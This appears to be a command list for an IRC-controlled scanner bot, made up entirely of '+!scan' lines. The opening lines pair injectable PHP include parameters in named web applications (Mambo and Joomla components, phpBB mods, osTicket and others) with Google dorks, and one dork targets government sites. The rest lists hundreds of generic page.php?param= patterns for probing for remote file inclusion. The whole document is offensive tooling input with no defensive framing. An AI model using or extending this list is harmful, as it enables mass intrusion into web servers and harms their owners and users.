+!scan /ppa/inc/functions.inc.php?config[ppa_root_path]= allinurl:**/screens/displayimage.php?pid=*
+!scan /spid/lang/lang.php?lang_path= allinurl:**/spid.php allinurl:**/spid.php?cat=*lang=
+!scan /classes.php?LOCAL_PATH= "powered by siteframe"
+!scan al_initialize.php?alpath= "Powered by AutoLinks Pro"
+!scan /modules/newbb_plus/class/forumpollrenderer.php?bbPath[path]= allinurl:*br*/newbb_plus/*
+!scan /index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path= "Powered by Mambo" inurl:*gov*
+!scan /extensions/moblog/moblog_lib.php?basedir= "powered by pivot"
+!scan /app/common/lib/codeBeautifier/Beautifier/Core.php?BEAUT_PATH= "phpCodeGenie v. 3.0.2"
+!scan components/com_performs/performs.php?mosConfig_absolute_path= inurl:"com_performs"
+!scan modules/AllMyGuests/signin.php?_AMGconfig[cfg_serverpath]= inurl:"AllMyGuests"
+!scan /components/com_rsgallery/rsgallery.html.php?mosConfig_absolute_path= allinurl:"com_rsgallery"
+!scan /components/com_smf/smf.php?mosConfig_absolute_path= allinurl:"com_smf"
+!scan /components/com_cpg/cpg.php?mosConfig_absolute_path= index.php?option=com_cpg
+!scan administrator/components/com_peoplebook/param.peoplebook.php?mosConfig_absolute_path= inurl:"com_peoplebook"
+!scan /admin_modules/admin_module_deldir.inc.php?config[path_src_include]= "Powered by yappa-ng 2.3.1"
+!scan inc/cmses/aedating4CMS.php?dir[inc]= inurl:flashchat site:br bp_ncom.php?bnrep= "Script r?alis? par BinGo PHP"
+!scan /components/com_mtree/Savant2/Savant2_Plugin_textarea.php?mosConfig_absolute_path= inurl:"/com_mtree/"
+!scan /jscript.php?my_ms[root]= intitle:"myspeach" inurl:"chat_exemple.php"
+!scan /popup_window.php?site_isp_root= inurl:"Squirrelcart"
+!scan /yabbse/Sources/Packages.php?sourcedir= inurl:Yabbse
+!scan /include/main.php?config[search_disp]=true&include_dir= allinurl:/osticket/ site:fr
+!scan /include/main.php?config[search_disp]=true&include_dir= allinurl:/osticket/ site:us
+!scan /includes/functions_portal.php?phpbb_root_path= "powered by Integramod"
+!scan /surveys/survey.inc.php?path= inurl:surveys
+!scan index.php?body= inurl:"index.php?body="
+!scan /classes/adodbt/sql.php?classes_dir= allinurl:adobt site:us
+!scan enc/content.php?Home_Path= "powered by doodle cart"
+!scan /classified_right.php?language_dir= inurl:classified.php phpbazar
+!scan /sources/functions.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /sources/template.php?CONFIG[main_path]= "(Powered By ScozNews)"
+!scan /embed/day.php?path= intitle:"Login to Calendar"
+!scan /includes/dbal.php?eqdkp_root_path= "powered by EQdkp"
+!scan /sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]= "Powered By Aardvark Topsites PHP 4.2.2"
+!scan /includes/kb_constants.php?module_root_path= "Powered by Knowledge Base"
+!scan /mcf.php?content= allinurl:"mcf.php" site:.de
+!scan /components/com_facileforms/facileforms.frame.php?ff_compath= allinurl:"com_facileforms" site:.ar
+!scan skins/advanced/advanced1.php?pluginpath[0]= "Sabdrimer CMS"
+!scan /zipndownload.php?PP_PATH= "Powered by: PhotoPost PHP 4.6"
+!scan /administrator/components/com_serverstat/install.serverstat.php?mosConfig_absolute_path= inurl:"com_serverstat"
+!scan /components/com_zoom/includes/database.php?mosConfig_absolute_path= inurl:"index.php?option="com_zoom"
+!scan /main.php?sayfa= inurl:"main.php?sayfa="
+!scan /components/com_extended_registration/registration_detailed.inc.php?mosConfig_absolute_path= allinurl:com_extended_registration
+!scan /addpost_newpoll.php?addpoll=preview&thispath= allinurl:"/ubbthreads/"
+!scan /header.php?abspath= "MobilePublisherPHP"
+!scan components/com_performs/performs.php?mosConfig_absolute_path= inurl:"com_performs"
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:index.php?option=com_remository
+!scan impex/ImpExData.php?systempath= intext:powered by vbulletin
+!scan /modules/vwar/admin/admin.php?vwar_root= allinurl:vwar site:.com
+!scan /coin_includes/constants.php?_CCFG[_PKG_PATH_INCL]= "powered by phpCOIN 1.2.3"
+!scan administrator/components/com_remository/admin.remository.php?mosConfig_absolute_path= inurl:.com/index.php?option=com_remository
+!scan /tools/send_reminders.php?includedir= allinurl:day.php?date=
+!scan pagina.php?ir=
+!scan home.php?qry=
+!scan index3.php?url=
+!scan index1.php?action=
+!scan press.php?param=
+!scan view.php?adresa=
+!scan pagina.php?type=
+!scan file.php?ki=
+!scan gallery.php?seite=
+!scan include.php?loader=
+!scan index2.php?module=
+!scan gallery.php?strona=
+!scan general.php?itemnav=
+!scan template.php?h=
+!scan nota.php?header=
+!scan blank.php?ki=
+!scan enter.php?base_dir=
+!scan index1.php?modo=
+!scan general.php?thispage=
+!scan view.php?var=
+!scan include.php?*[*]*=
+!scan layout.php?pagina=
+!scan nota.php?pollname=
+!scan index3.php?p=
+!scan padrao.php?pre=
+!scan home.php?pa=
+!scan main.php?type=
+!scan padrao.php?ir=
+!scan *inc*.php?left=
+!scan sitio.php?start=
+!scan gallery.php?eval=
+!scan index2.php?base_dir=
+!scan index1.php?op=
+!scan *.php?include=
+!scan padrao.php?sivu=
+!scan enter.php?pagina=
+!scan general.php?xlink=
+!scan principal.php?recipe=
+!scan file.php?pref=
+!scan show.php?go=
+!scan nota.php?ki=
+!scan down*.php?oldal=
+!scan layout.php?disp=
+!scan standard.php?goto=
+!scan index2.php?phpbb_root_path=
+!scan path.php?action=
+!scan enter.php?chapter=
+!scan base.php?incl=
+!scan mod*.php?link=
+!scan include.php?nivel=
+!scan head.php?pollname=
+!scan enter.php?mod=
+!scan show.php?corpo=
+!scan default.php?name=
+!scan standard.php?param=
+!scan general.php?where=
+!scan head.php?*[*]*=
+!scan info.php?strona=
+!scan principal.php?url=
+!scan template.php?str=
+!scan home.php?ref=
+!scan down*.php?left=
+!scan standard.php?url=
+!scan main.php?doshow=
+!scan press.php?*root*=
+!scan view.php?*[*]*=
+!scan view.php?second=
+!scan index.php?to=
+!scan page.php?cmd=
+!scan view.php?b=
+!scan include.php?loc=
+!scan info.php?option=
+!scan show.php?x=
+!scan template.php?texto=
+!scan index3.php?ir=
+!scan template.php?second=
+!scan print.php?chapter=
+!scan file.php?inc=
+!scan file.php?cont=
+!scan index.php?filepath=
+!scan home.php?pr=
+!scan view.php?cmd=
+!scan index.php?module=
+!scan file.php?url=
+!scan include.php?chapter=
+!scan path.php?my=
+!scan principal.php?param=
+!scan general.php?menue=
+!scan index1.php?b=
+!scan info.php?chapter=
+!scan nota.php?chapter=
+!scan general.php?include=
+!scan start.php?addr=
+!scan home.php?itemnav=
+!scan index1.php?qry=
+!scan default.php?read=
+!scan view.php?incl=
+!scan down*.php?to=
+!scan index1.php?loc=
+!scan principal.php?viewpage=
+!scan index2.php?choix=
+!scan page.php?addr=
+!scan index1.php?dir=
+!scan principal.php?pr=
+!scan press.php?seite=
+!scan standard.php?seccion=
+!scan page.php?goto=
+!scan head.php?cmd=
+!scan home.php?sec=
+!scan home.php?category=
+!scan standard.php?cmd=
+!scan mod*.php?thispage=
+!scan *.php?secc=
+!scan base.php?to=
+!scan index3.php?chapter=
+!scan start.php?seccion=
+!scan base.php?middlePart=
+!scan view.php?choix=
+!scan template.php?panel=
+!scan base.php?panel=
+!scan template.php?mod=
+!scan path.php?menue=
+!scan info.php?j=
+!scan blank.php?pref=
+!scan sub*.php?channel=
+!scan padrao.php?secc=
+!scan standard.php?in=
+!scan general.php?cmd=
+!scan pagina.php?panel=
+!scan *inc*.php?inc=
+!scan template.php?where=
+!scan general.php?id=
+!scan path.php?channel=
+!scan standard.php?pref=
+!scan template.php?play=
+!scan gallery.php?seccion=
+!scan layout.php?my=
+!scan page.php?tipo=
+!scan sitio.php?rub=
+!scan pagina.php?u=
+!scan file.php?ir=
+!scan *inc*.php?sivu=
+!scan padrao.php?seite=
+!scan press.php?i=
+!scan path.php?start=
+!scan mod*.php?tipo=
+!scan page.php?chapter=
+!scan home.php?recipe=
+!scan gallery.php?ref=
+!scan enter.php?pname=
+!scan press.php?inc=
+!scan layout.php?path=
+!scan print.php?open=
+!scan mod*.php?channel=
+!scan down*.php?phpbb_root_path=
+!scan *inc*.php?str=
+!scan gallery.php?phpbb_root_path=
+!scan include.php?middlePart=
+!scan sub*.php?destino=
+!scan index2.php?left=
+!scan view.php?phpbb_root_path=
+!scan info.php?read=
+!scan base.php?k=
+!scan home.php?sp=
+!scan index3.php?pag=
+!scan down*.php?OpenPage=
+!scan sitio.php?strona=
+!scan nota.php?seite=
+!scan main.php?strona=
+!scan sitio.php?get=
+!scan sitio.php?index=
+!scan index3.php?option=
+!scan index.php?basepath=
+!scan enter.php?a=
+!scan main.php?second=
+!scan info.php?in=
+!scan print.php?pname=
+!scan start.php?where=
+!scan blank.php?itemnav=
+!scan default.php?n=
+!scan down*.php?filepath=
+!scan blank.php?pagina=
+!scan main.php?corpo=
+!scan principal.php?filepath=
+!scan view.php?option=
+!scan index1.php?d=
+!scan show.php?*root*=
+!scan principal.php?pre=
+!scan start.php?p=
+!scan standard.php?home=
+!scan down*.php?where=
+!scan *inc*.php?include=
+!scan enter.php?numero=
+!scan path.php?pre=
+!scan index2.php?oldal=
+!scan general.php?addr=
+!scan home.php?loader=
+!scan general.php?tipo=
+!scan start.php?eval=
+!scan index.php?secao=
+!scan index.php?disp=
+!scan info.php?op=
+!scan head.php?mod=
+!scan template.php?page=
+!scan include.php?sivu=
+!scan sitio.php?section=
+!scan nota.php?doshow=
+!scan home.php?seite=
+!scan home.php?a=
+!scan index.php?modo=
+!scan page.php?url=
+!scan show.php?module=
+!scan pagina.php?left=
+!scan layout.php?c=
+!scan sitio.php?texto=
+!scan gallery.php?oldal=
+!scan press.php?incl=
+!scan principal.php?w=
+!scan index2.php?pname=
+!scan path.php?path=
+!scan principal.php?goto=
+!scan *inc*.php?category=
+!scan standard.php?base_dir=
+!scan default.php?pag=
+!scan home.php?where=
+!scan default.php?pr=
+!scan page.php?sivu=
+!scan main.php?adresa=
+!scan *inc*.php?adresa=
+!scan default.php?to=
+!scan padrao.php?str=
+!scan include.php?my=
+!scan default.php?opcion=
+!scan show.php?home=
+!scan main.php?str=
+!scan index.php?load=
+!scan index3.php?rub=
+!scan sub*.php?str=
+!scan path.php?in=
+!scan base.php?ev=
+!scan principal.php?choix=
+!scan start.php?index=
+!scan nota.php?mod=
+!scan default.php?m=
+!scan sub*.php?mid=
+!scan include.php?name=
+!scan path.php?link=
+!scan view.php?pag=
+!scan principal.php?my=
+!scan index1.php?*[*]*=
+!scan pagina.php?oldal=
+!scan padrao.php?loc=
+!scan path.php?header=
+!scan *inc*.php?base_dir=
+!scan padrao.php?rub=
+!scan principal.php?basepath=
+!scan view.php?disp=
+!scan page.php?incl=
+!scan gallery.php?disp=
+!scan head.php?modo=
+!scan nota.php?oldal=
+!scan include.php?u=
+!scan principal.php?pagina=
+!scan show.php?left=
+!scan gallery.php?url=
+!scan sub*.php?*root*=
+!scan print.php?choix=
+!scan head.php?filepath=
+!scan include.php?corpo=
+!scan mod*.php?section=
+!scan general.php?name=
+!scan base.php?disp=
+!scan sub*.php?action=
+!scan principal.php?module=
+!scan head.php?pname=
+!scan index.php?inc=
+!scan sub*.php?OpenPage=
+!scan press.php?dir=
+!scan gallery.php?xlink=
+!scan mod*.php?to=
+!scan show.php?xlink=
+!scan file.php?left=
+!scan padrao.php?oldal=
+!scan sub*.php?lang=
+!scan nota.php?destino=
+!scan general.php?module=
+!scan down*.php?x=
+!scan main.php?id=
+!scan enter.php?sp=
+!scan index2.php?loader=
+!scan enter.php?loader=
+!scan index3.php?redirect=
+!scan down*.php?param=
+!scan default.php?ki=
+!scan principal.php?disp=
+!scan sub*.php?viewpage=
+!scan template.php?pre=
+!scan mod*.php?goFile=
+!scan padrao.php?h=
+!scan press.php?second=
+!scan padrao.php?read=
+!scan base.php?seccion=
+!scan mod*.php?cont=
+!scan index1.php?l=
+!scan down*.php?pr=
+!scan gallery.php?viewpage=
+!scan template.php?load=
+!scan sitio.php?doshow=
+!scan *inc*.php?type=
+!scan nota.php?pr=
+!scan padrao.php?destino=
+!scan show.php?filepath=
+!scan sitio.php?qry=
+!scan general.php?pr=
+!scan layout.php?panel=
+!scan index2.php?channel=
+!scan principal.php?opcion=
+!scan pagina.php?go=
+!scan start.php?str=
+!scan press.php?*[*]*=
+!scan default.php?var=
+!scan index.php?ev=
+!scan pagina.php?pre=
+!scan nota.php?content=
+!scan include.php?adresa=
+!scan sub*.php?corpo=
+!scan sitio.php?t=
+!scan index.php?sivu=
+!scan principal.php?q=
+!scan file.php?viewpage=
+!scan press.php?itemnav=
+!scan mod*.php?ev=
+!scan blank.php?OpenPage=
+!scan path.php?ev=
+!scan print.php?module=
+!scan head.php?tipo=
+!scan index.php?loc=
+!scan nota.php?basepath=
+!scan sitio.php?sec=
+!scan padrao.php?tipo=
+!scan index2.php?in=
+!scan default.php?cmd=
+!scan blank.php?channel=
+!scan mod*.php?j=
+!scan principal.php?eval=
+!scan layout.php?modo=
+!scan head.php?pageweb=
+!scan file.php?qry=
+!scan path.php?type=
+!scan info.php?t=
+!scan layout.php?g=
+!scan enter.php?play=
+!scan general.php?var=
+!scan principal.php?s=
+!scan standard.php?pagina=
+!scan standard.php?subject=
+!scan base.php?second=
+!scan nota.php?base_dir=
+!scan index2.php?showpage=
+!scan index3.php?type=
+!scan head.php?inc=
+!scan pagina.php?basepath=
+!scan base.php?cont=
+!scan main.php?pname=
+!scan mod*.php?chapter=
+!scan sitio.php?ev=
+!scan home.php?sekce=
+!scan sitio.php?sp=
+!scan *inc*.php?modo=
+!scan nota.php?tipo=
+!scan include.php?goto=
+!scan file.php?pg=
+!scan head.php?g=
+!scan general.php?header=
+!scan view.php?to=
+!scan include.php?middle=
+!scan start.php?*root*=
+!scan enter.php?pref=
+!scan index3.php?open=
+!scan start.php?module=
+!scan include.php?phpbb_root_path=
+!scan main.php?load=
+!scan index2.php?include=
+!scan enter.php?pg=
+!scan nota.php?itemnav=
+!scan include.php?option=
+!scan index2.php?type=
+!scan padrao.php?redirect=
+!scan pagina.php?my=
+!scan gallery.php?pre=
+!scan base.php?link=
+!scan path.php?chapter=
+!scan show.php?sp=
+!scan enter.php?w=
+!scan info.php?texto=
+!scan enter.php?open=
+!scan base.php?rub=
+!scan home.php?section=
+!scan default.php?y=
+!scan gallery.php?*[*]*=
+!scan include.php?cmd=
+!scan standard.php?dir=
+!scan pagina.php?link=
+!scan layout.php?page=
+!scan index3.php?pageweb=
+!scan index1.php?o=
+!scan gallery.php?addr=
+!scan include.php?numero=
+!scan path.php?destino=
+!scan index3.php?home=
+!scan *inc*.php?menu=
+!scan default.php?seite=
+!scan path.php?where=
+!scan path.php?eval=
+!scan pagina.php?home=
+!scan base.php?choix=
+!scan template.php?cont=
+!scan info.php?pagina=
+!scan file.php?doshow=
+!scan index3.php?pname=
+!scan nota.php?in=
+!scan default.php?x=
+!scan path.php?middlePart=
+!scan down*.php?sp=
+!scan page.php?module=
+!scan default.php?option=
+!scan index3.php?ev=
+!scan standard.php?eval=
+!scan gallery.php?ki=
+!scan down*.php?second=
+!scan blank.php?path=
+!scan pagina.php?v=
+!scan path.php?y=
+!scan template.php?qry=
+!scan start.php?option=
+!scan info.php?subject=
+!scan page.php?abre=
+!scan sub*.php?g=
+!scan file.php?pollname=
+!scan index3.php?var=
+!scan layout.php?goto=
+!scan home.php?g=
+!scan pagina.php?incl=
+!scan home.php?action=
+!scan include.php?oldal=
+!scan print.php?left=
+!scan file.php?play=
+!scan print.php?u=
+!scan nota.php?v=
+!scan home.php?str=
+!scan start.php?loader=
+!scan press.php?panel=
+!scan start.php?showpage=
+!scan info.php?ref=
+!scan pagina.php?id=
+!scan blank.php?name=
+!scan page.php?mod=
+!scan default.php?param=
+!scan down*.php?texto=
+!scan head.php?str=
+!scan print.php?header=
+!scan mod*.php?dir=
+!scan index3.php?mid=
+!scan down*.php?disp=
+!scan blank.php?j=
+!scan view.php?where=
+!scan path.php?goto=
+!scan default.php?type=
+!scan blank.php?subject=
+!scan mod*.php?incl=
+!scan path.php?play=
+!scan base.php?l=
+!scan path.php?filepath=
+!scan gallery.php?base_dir=
+!scan show.php?middlePart=
+!scan *inc*.php?to=
+!scan index2.php?rub=
+!scan general.php?opcion=
+!scan layout.php?xlink=
+!scan home.php?page=
+!scan padrao.php?name=
+!scan layout.php?z=
+!scan pagina.php?nivel=
+!scan default.php?oldal=
+!scan view.php?seccion=
+!scan template.php?k=
+!scan sitio.php?*root*=
+!scan file.php?strona=
+!scan main.php?chapter=
+!scan layout.php?chapter=
+!scan layout.php?incl=
+!scan include.php?url=
+!scan base.php?sivu=
+!scan index.php?link=
+!scan sub*.php?cont=
+!scan mod*.php?pag=
+!scan info.php?oldal=
+!scan index2.php?ref=
+!scan general.php?rub=
+!scan default.php?str=
+!scan head.php?ev=
+!scan head.php?sekce=
+!scan sub*.php?path=
+!scan view.php?page=
+!scan layout.php?pref=
+!scan main.php?j=
+!scan index2.php?basepath=
+!scan path.php?doshow=
+!scan path.php?panel=
+!scan file.php?pagina=
+!scan gallery.php?qry=
+!scan index2.php?e=
+!scan path.php?sp=
+!scan main.php?url=
+!scan pagina.php?load=
+!scan general.php?section=
+!scan index.php?include=
+!scan base.php?filepath=
+!scan default.php?incl=
+!scan include.php?content=
+!scan show.php?redirect=
+!scan blank.php?basepath=
+!scan template.php?ref=
+!scan index1.php?pre=
+!scan head.php?load=
+!scan main.php?subject=
+!scan general.php?base_dir=
+!scan start.php?in=
+!scan show.php?abre=
+!scan file.php?y=
+!scan down*.php?ev=
+!scan padrao.php?choix=
+!scan index.php?channel=
+!scan index1.php?home=
+!scan home.php?ev=
+!scan nota.php?t=
+!scan index2.php?ki=
+!scan base.php?pag=
+!scan blank.php?panel=
+!scan default.php?ir=
+!scan sub*.php?header=
+!scan info.php?var=
+!scan general.php?qry=
+!scan index2.php?home=
+!scan press.php?nivel=
+!scan enter.php?read=
+!scan head.php?adresa=
+!scan print.php?param=
+!scan default.php?sp=
+!scan enter.php?pr=
+!scan start.php?panel=
+!scan template.php?dir=
+!scan blank.php?loader=
+!scan start.php?cmd=
+!scan show.php?pre=
+!scan padrao.php?d=
+!scan view.php?content=
+!scan print.php?strona=
+!scan sitio.php?recipe=
+!scan principal.php?read=
+!scan standard.php?showpage=
+!scan main.php?pg=
+!scan sitio.php?inc=
+!scan page.php?panel=
+!scan info.php?header=
+!scan press.php?addr=
+!scan info.php?itemnav=
+!scan template.php?s=
+!scan file.php?to=
+!scan main.php?tipo=
+!scan base.php?itemnav=
+!scan standard.php?where=
+!scan *inc*.php?ev=
+!scan sitio.php?modo=
+!scan sitio.php?disp=
+!scan print.php?addr=
+!scan mod*.php?oldal=
+!scan padrao.php?page=
+!scan show.php?thispage=
+!scan sub*.php?go=
+!scan start.php?load=
+!scan index2.php?option=
+!scan home.php?secao=
+!scan blank.php?mod=
+!scan index3.php?inc=
+!scan main.php?start=
+!scan standard.php?my=
+!scan enter.php?y=
+!scan enter.php?mid=
+!scan base.php?pageweb=
+!scan padrao.php?*root*=
+!scan main.php?action=
+!scan pagina.php?path=
+!scan press.php?id=
+!scan sub*.php?phpbb_root_path=
+!scan path.php?home=
+!scan index3.php?middle=
+!scan main.php?inc=
+!scan index3.php?get=
+!scan default.php?seccion=
+!scan index3.php?cmd=
+!scan index.php?pname=
+!scan print.php?numero=
+!scan include.php?in=
+!scan press.php?subject=
+!scan include.php?secao=
+!scan include.php?sec=
+!scan index3.php?xlink=
+!scan general.php?texto=
+!scan index3.php?go=
+!scan sub*.php?sec=
+!scan home.php?channel=
+!scan base.php?body=
+!scan index.php?cmd=
+!scan enter.php?ir=
+!scan home.php?oldal=
+!scan index3.php?disp=
+!scan index3.php?left=
+!scan sub*.php?middle=
+!scan head.php?pag=
+!scan general.php?menu=
+!scan nota.php?seccion=
+!scan path.php?xlink=
+!scan show.php?modo=
+!scan page.php?mid=
+!scan index1.php?link=
+!scan blank.php?sp=
+!scan index1.php?pagina=
+!scan head.php?left=
+!scan default.php?panel=
+!scan *inc*.php?doshow=
+!scan blank.php?id=
+!scan print.php?read=
+!scan enter.php?phpbb_root_path=
+!scan sitio.php?destino=
+!scan show.php?z=
+!scan start.php?basepath=
+!scan principal.php?d=
+!scan blank.php?strona=
+!scan start.php?name=
+!scan default.php?chapter=
+!scan template.php?y=
+!scan head.php?goto=
+!scan page.php?where=
+!scan layout.php?category=
+!scan index1.php?my=
+!scan path.php?qry=
+!scan principal.php?phpbb_root_path=
+!scan nota.php?channel=
+!scan default.php?*root*=
+!scan enter.php?cmd=
+!scan file.php?include=
+!scan enter.php?body=
+!scan index.php?chapter=
+!scan page.php?choix=
+!scan start.php?xlink=
+!scan home.php?k=
+!scan standard.php?phpbb_root_path=
+!scan principal.php?middlePart=
+!scan include.php?panel=
+!scan mod*.php?m=
+!scan default.php?choix=
+!scan start.php?oldal=
+!scan index.php?recipe=
+!scan template.php?path=
+!scan down*.php?ir=
+!scan pagina.php?dir=
+!scan sitio.php?abre=
+!scan nota.php?module=
+!scan info.php?xlink=
+!scan enter.php?lang=
+!scan index1.php?recipe=
+!scan general.php?redirect=
+!scan view.php?recipe=
+!scan home.php?ir=
+!scan padrao.php?open=
+!scan blank.php?page=
+!scan sub*.php?category=
+!scan *inc*.php?body=
+!scan enter.php?middle=
+!scan home.php?path=
+!scan base.php?subject=
+!scan padrao.php?u=
+!scan sub*.php?my=
+!scan enter.php?type=
+!scan down*.php?pre=
+!scan base.php?w=
+!scan main.php?path=
+!scan nota.php?ir=
+!scan press.php?link=
+!scan blank.php?ir=
+!scan page.php?showpage=
+!scan home.php?disp=
+!scan gallery.php?pollname=
+!scan index3.php?secc=
+!scan down*.php?open=
+!scan down*.php?pageweb=
+!scan home.php?panel=
+!scan default.php?eval=
+!scan index1.php?pr=
+!scan main.php?ref=
+!scan view.php?showpage=
+!scan layout.php?link=
+!scan show.php?get=
+!scan standard.php?qry=
+!scan sitio.php?tipo=
+!scan index2.php?thispage=
+!scan layout.php?cont=
+!scan index3.php?pollname=
+!scan default.php?destino=
+!scan pagina.php?cmd=
+!scan view.php?body=
+!scan head.php?rub=
+!scan standard.php?include=
+!scan padrao.php?seccion=
+!scan down*.php?r=
+!scan path.php?secao=
+!scan press.php?opcion=
+!scan gallery.php?tipo=
+!scan main.php?param=
+!scan standard.php?e=
+!scan index1.php?v=
+!scan down*.php?in=
+!scan pagina.php?secao=
+!scan nota.php?include=
+!scan sitio.php?secao=
+!scan standard.php?secc=
+!scan print.php?my=
+!scan general.php?abre=
+!scan general.php?link=
+!scan gallery.php?loader=
+!scan default.php?id=
+!scan index3.php?include=
+!scan pagina.php?to=
+!scan enter.php?strona=
+!scan standard.php?panel=
+!scan sub*.php?s=
+!scan show.php?channel=
+!scan enter.php?get=
+!scan path.php?var=
+!scan enter.php?r=
+!scan general.php?subject=
+!scan index3.php?phpbb_root_path=
+!scan enter.php?pa=
+!scan gallery.php?where=
+!scan include.php?header=
+!scan head.php?middle=
+!scan include.php?mid=
+!scan blank.php?incl=
+!scan sub*.php?load=
+!scan index2.php?corpo=
+!scan gallery.php?sp=
+!scan show.php?chapter=
+!scan sub*.php?b=
+!scan index1.php?incl=
+!scan home.php?choix=
+!scan general.php?adresa=
+!scan index1.php?c=
+!scan print.php?goto=
+!scan index2.php?var=
+!scan main.php?pref=
+!scan sub*.php?sp=
+!scan index1.php?pname=
+!scan template.php?doshow=
+!scan padrao.php?base_dir=
+!scan path.php?incl=
+!scan info.php?recipe=
+!scan view.php?sec=
+!scan file.php?where=
+!scan index2.php?my=
+!scan print.php?name=
+!scan info.php?c=
+!scan include.php?w=
+!scan start.php?op=
+!scan principal.php?cont=
+!scan print.php?menue=
+!scan info.php?f=
+!scan main.php?section=
+!scan padrao.php?xlink=
+!scan view.php?header=
+!scan index1.php?url=
+!scan gallery.php?basepath=
+!scan layout.php?menue=
+!scan head.php?y=
+!scan template.php?mid=
+!scan sub*.php?id=
+!scan sub*.php?content=
+!scan show.php?type=
+!scan start.php?corpo=
+!scan file.php?chapter=
+!scan base.php?id=
+!scan mod*.php?qry=
+!scan home.php?chapter=
+!scan standard.php?chapter=
+!scan press.php?page=
+!scan default.php?strona=
+!scan sitio.php?chapter=
+!scan nota.php?n=
+!scan start.php?adresa=
+!scan gallery.php?index=
+!scan nota.php?h=
+!scan page.php?oldal=
+!scan enter.php?panel=
+!scan blank.php?t=
+!scan default.php?e=
+!scan sub*.php?itemnav=
+!scan standard.php?go=
+!scan start.php?pollname=
+!scan sitio.php?menu=
+!scan sub*.php?module=
+!scan press.php?goFile=
+!scan principal.php?id=
+!scan enter.php?thispage=
+!scan down*.php?incl=
+!scan principal.php?z=
+!scan main.php?my=
+!scan start.php?ir=
+!scan mod*.php?index=
+!scan info.php?ki=
+!scan file.php?loader=
+!scan index.php?mid=
+!scan sitio.php?r=
+!scan down*.php?seite=
+!scan sub*.php?play=
+!scan index2.php?doshow=
+!scan index2.php?chapter=
+!scan show.php?path=
+!scan base.php?lang=
+!scan nota.php?inc=
+!scan standard.php?index=
+!scan gallery.php?to=
+!scan info.php?base_dir=
+!scan index1.php?var=
+!scan gallery.php?abre=
+!scan principal.php?p=
+!scan pagina.php?index=
+!scan view.php?qry=
+!scan home.php?tipo=
+!scan page.php?numero=
+!scan index1.php?strona=
+!scan show.php?inc=
+!scan gallery.php?pag=
+!scan view.php?channel=
+!scan index2.php?redirect=
+!scan pagina.php?middlePart=
+!scan template.php?base_dir=
+!scan default.php?mod=
+!scan index.php?op=
+!scan info.php?mid=
+!scan home.php?module=
+!scan general.php?left=
+!scan general.php?pre=
+!scan print.php?doshow=
+!scan general.php?page=
+!scan path.php?adresa=
+!scan padrao.php?type=
+!scan template.php?pag=
+!scan standard.php?pre=
+!scan blank.php?ref=
+!scan down*.php?z=
+!scan general.php?inc=
+!scan home.php?read=
+!scan page.php?seite=
+!scan pagina.php?section=
+!scan home.php?menu=
+!scan default.php?basepath=
+!scan index2.php?open=
+!scan blank.php?pname=
+!scan sub*.php?modo=
+!scan index2.php?goto=
+!scan path.php?subject=
+!scan index.php?pre=
+!scan general.php?sivu=
+!scan general.php?read=
+!scan principal.php?ev=
+!scan press.php?to=
+!scan main.php?middle=
+!scan sitio.php?pageweb=
+!scan base.php?seite=
+!scan print.php?pollname=
+!scan index2.php?strona=
+!scan template.php?f=
+!scan *inc*.php?j=
+!scan index2.php?filepath=
+!scan file.php?type=
+!scan index1.php?oldal=
+!scan template.php?e=
+!scan index2.php?second=
+!scan press.php?pagina=
+!scan print.php?ki=
+!scan index3.php?sekce=
+!scan page.php?z=
+!scan enter.php?left=
+!scan info.php?filepath=
+!scan head.php?middlePart=
+!scan gallery.php?ev=
+!scan index3.php?ref=
+!scan base.php?opcion=
+!scan file.php?id=
+!scan path.php?category=
+!scan index3.php?start=
+!scan print.php?loc=
+!scan sitio.php?body=
+!scan pagina.php?n=
+!scan start.php?rub=
+!scan *inc*.php?i=
+!scan down*.php?s=
+!scan padrao.php?a=
+!scan page.php?OpenPage=
+!scan gallery.php?option=
+!scan mod*.php?sekce=
+!scan blank.php?pre=
+!scan general.php?channel=
+!scan template.php?thispage=
+!scan head.php?viewpage=
+!scan index2.php?OpenPage=
+!scan file.php?incl=
+!scan sitio.php?e=
+!scan page.php?section=
+!scan mod*.php?middle=
+!scan page.php?cont=
+!scan sub*.php?adresa=
+!scan index1.php?goFile=
+!scan blank.php?action=
+!scan principal.php?loader=
+!scan gallery.php?id=
+!scan index2.php?pg=
+!scan sub*.php?op=
+!scan layout.php?thispage=
+!scan padrao.php?body=
+!scan base.php?t=
+!scan main.php?addr=
+!scan start.php?mid=
+!scan gallery.php?secao=
+!scan press.php?redirect=
+!scan pagina.php?tipo=
+!scan pagina.php?seccion=
+!scan layout.php?action=
+!scan index.php?w=
+!scan sitio.php?option=
+!scan head.php?where=
+!scan principal.php?tipo=
+!scan index2.php?category=
+!scan pagina.php?lang=
+!scan include.php?ref=
+!scan press.php?loader=
+!scan gallery.php?showpage=
+!scan gallery.php?go=
+!scan enter.php?start=
+!scan press.php?lang=
+!scan general.php?p=
+!scan index3.php?thispage=
+!scan index.php?sekce=
+!scan sub*.php?seite=
+!scan index2.php?get=
+!scan sitio.php?go=
+!scan layout.php?addr=
+!scan nota.php?mid=
+!scan page.php?p=
+!scan mod*.php?corpo=
+!scan include.php?cont=
+!scan press.php?t=
+!scan blank.php?category=
+!scan sub*.php?where=
+!scan *inc*.php?y=
+!scan index3.php?index=
+!scan path.php?recipe=
+!scan nota.php?category=
+!scan info.php?loader=
+!scan print.php?sp=
+!scan show.php?d=
+!scan enter.php?menue=
+!scan page.php?phpbb_root_path=
+!scan path.php?body=
+!scan index1.php?t=
+!scan principal.php?menue=
+!scan print.php?cont=
+!scan pagina.php?z=
+!scan nota.php?adresa=
+!scan main.php?thispage=
+!scan default.php?mid=
+!scan layout.php?tipo=
+!scan blank.php?xlink=
+!scan index3.php?d=
+!scan enter.php?b=
+!scan main.php?loc=
+!scan sub*.php?oldal=
+!scan standard.php?z=
+!scan general.php?b=
+!scan include.php?left=
+!scan show.php?base_dir=
+!scan sitio.php?middlePart=
+!scan template.php?a=
+!scan print.php?sivu=
+!scan press.php?OpenPage=
+!scan page.php?read=
+!scan index.php?param=
+!scan default.php?channel=
+!scan default.php?cont=
+!scan sub*.php?link=
+!scan general.php?pollname=
+!scan padrao.php?texto=
+!scan base.php?base_dir=
+!scan template.php?nivel=
+!scan file.php?texto=
+!scan enter.php?page=
+!scan file.php?middle=
+!scan standard.php?str=
